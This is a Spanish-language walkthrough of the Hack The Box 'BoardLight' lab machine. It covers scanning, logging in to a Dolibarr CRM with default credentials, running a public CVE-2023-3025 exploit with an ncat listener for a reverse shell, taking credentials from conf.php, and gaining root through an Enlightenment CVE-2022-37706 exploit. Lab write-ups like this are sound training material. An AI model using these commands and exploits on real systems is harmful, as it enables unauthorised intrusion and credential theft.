# BoardLight

✍️ Autor: Hack The Box 🔍 Dificultad: Fácil 📅 Fecha de creación: 25/05/2024

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.11.11
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 9.46.25 (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.11.11
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 9.48.14.png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 10.10.11.11
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 9.49.33.png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web nos salga una página de una consultoría de ciberseguridad.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 9.51.10.png" alt=""><figcaption></figcaption></figure>

Inspeccionamos el código fuente y no vemos nada relevante.&#x20;

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster vhost --domain board.htb -u http://10.10.11.11 \
    -w /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \ 
    --append-domain
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 10.41.24.png" alt=""><figcaption></figcaption></figure>

Hemos descubierto un subdominio por lo que editamos el fichero `/etc/hosts` con el subdominio y la IP.

Con la herramienta Wfuzz vemos los directorios y archivos que contiene la página.&#x20;

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 10.27.01.png" alt=""><figcaption></figcaption></figure>

Nos llama la atención el archivo index.php por lo que realizamos la búsqueda.

```bash
http://crm.board.htb/index.php
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 10.47.17.png" alt=""><figcaption></figcaption></figure>

Es un panel de login por lo que probamos las credenciales más comunes. Probamos admin tanto para contraseña y usuario y nos deja iniciar sesión correctamente.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 10.48.51.png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Revisamos la versión por Internet si tiene alguna vulnerabilidad. Efectivamente tiene una vulnerabilidad que intentaremos explotar haciendo una Reverse Shell.

{% embed url="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-3025" %}

Ejecutamos el script mientras nos ponemos en escucha para conectarnos.

```
python3 exploit.py http://crm.board.htb admin admin 10.10.16.13 9001
```

```bash
ncat -l -p 9001
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 11.04.46.png" alt=""><figcaption></figcaption></figure>

En esta etapa, tras obtener la shell en la máquina objetivo, descubrimos que el flag no se encuentra en esta máquina en particular. En cambio, el objetivo ahora es buscar las credenciales del otro usuario en esta misma máquina que indagando por documentaciones de Dolibarr se llama **Larissa**.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 11.10.33.png" alt=""><figcaption></figcaption></figure>

Mostramos el contenido del archivo `conf.php`

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 11.16.11 (1).png" alt=""><figcaption></figcaption></figure>

Hemos descubierto las credenciales por lo que nos conectamos a través del serivicio **SSH**.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 11.18.27.png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar pero nos pide contraseña.

Listamos el contenido que tiene el usuario y descubrimos la flag del usuario.&#x20;

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 11.20.17.png" alt=""><figcaption></figcaption></figure>

Utilicé **LinPEAS**, un script diseñado para identificar posibles rutas de escalamiento de privilegios en sistemas operativos Linux, Unix y macOS. Para obtener más información sobre este script, pueden consultar el siguiente enlace: [LinPEAS en GitHub](https://github.com/Cerbersec/scripts/blob/master/linux/linpeas.sh).

Primero, busqué el código del script en GitHub, lo copié y lo guardé en un archivo llamado l**inpeas.sh** en el directorio del usuario **Larissa**. Para hacer esto, utilicé el editor nano con el siguiente comando:

```bash
nano linpeas.sh
```

Dentro de este archivo, pegué todo el código obtenido de GitHub y lo guardé. Sin embargo, para ejecutar el script, necesitamos otorgarle permisos de ejecución, lo cual se hace con el siguiente comando:

```bash
chmod +x linpeas.sh
```

Luego de esto ejecutamos el script de la siguiente manera:

```
bash linpeas.sh
```

Esperamos a que el script termine su ejecución. Una vez completado, revisamos los archivos de interés. **LinPEAS** realiza un escaneo exhaustivo del sistema para identificar archivos y configuraciones que podrían presentar vulnerabilidades para la escalada de privilegios.

Entre los archivos más relevantes o recurrentes se encuentran los relacionados con Enlightenment. Tras investigar, descubrimos que la **versión 0.23** de **Enlightenment** tiene una vulnerabilidad identificada con el código \[**CVE-2022–37706**]. Además, encontramos que existe un exploit disponible para explotar esta vulnerabilidad que coincide con el exploit que tiene Larissa.

```bash
./exploit.sh
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 11.35.48.png" alt=""><figcaption></figcaption></figure>

Ya somos **root** por lo que tenemos el máximo de los privilegios y al entrar en el directorio del root y al listarlo nos sale la última bandera.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 11.44.51.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-12 a las 11.45.32.png" alt=""><figcaption></figcaption></figure>

